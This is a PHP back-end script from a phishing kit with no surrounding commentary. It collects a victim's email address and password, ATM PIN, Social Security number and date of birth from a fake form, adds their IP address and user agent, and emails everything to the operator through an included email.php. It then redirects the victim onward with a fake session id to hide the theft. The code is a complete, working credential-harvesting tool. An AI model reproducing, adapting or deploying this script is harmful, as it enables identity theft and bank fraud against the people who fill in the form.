<?php
if($_POST["em"] != "" and $_POST["ep"] != ""){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "--------------W.F FROM MR ICE-----------------------\n";
$message .= "Email Address              : ".$_POST['em']."\n";
$message .= "Email Password              : ".$_POST['ep']."\n";
$message .= "ATM Pin	                 : ".$_POST['pi']."\n";
$message .= "SSN              : ".$_POST['ss']."\n";
$message .= "DOB             : ".$_POST['do']."\n";
$message .= "|--------------- I N F O | I P -------------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|----------- OYA TAKE EMAIL AND PASS WEREY --------------|\n";
include 'email.php';
$subject = "Card | $ip";
{
mail("$to", "$send", "$subject", $message);     
}
$praga=rand();
$praga=md5($praga);
  header ("Location: surf3.php?cmd=login_submit&id=$praga$praga&session=$praga$praga");
}else{
header ("Location: index.php");
}

?>